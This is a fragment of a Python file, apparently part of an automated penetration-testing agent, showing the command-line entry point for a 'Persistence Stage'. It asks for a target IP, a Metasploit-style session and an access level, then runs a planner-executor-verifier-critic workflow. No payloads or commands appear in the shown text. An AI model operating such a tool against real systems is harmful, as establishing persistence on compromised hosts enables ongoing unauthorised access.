    print_colored(f"  {findings['summary']}", Colors.OKCYAN)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    return findings

# =============================================================================
# STANDALONE MAIN
# =============================================================================

def main():
    if "--graph" in sys.argv:
        workflow = build_graph()
        app = workflow.compile()
        try:
            print(app.get_graph().draw_ascii())
        except Exception:
            graph = app.get_graph()
            print("Nodes:", [n for n in graph.nodes])
            print("Edges:", [(e.source, e.target) for e in graph.edges])
        return

    print_colored("--- Persistence Stage (Standalone) ---", Colors.OKGREEN)
    print_colored("Nodes: planner → executor → verifier → critic", Colors.OKCYAN)

    target_ip = input("\n[Target IP]: ").strip()
    session_id = input("[Session ID]: ").strip()
    session_type = input("[Session Type (command_shell/meterpreter)]: ").strip() or "command_shell"
    access_level = input("[Access Level (user/root)]: ").strip() or "user"

    findings = run_persistence(
        target_ip=target_ip,
        session_id=session_id,
        session_type=session_type,
        access_level=access_level,
    )

    print("\n" + json.dumps(dict(findings), indent=2, default=str))


if __name__ == "__main__":
    main()
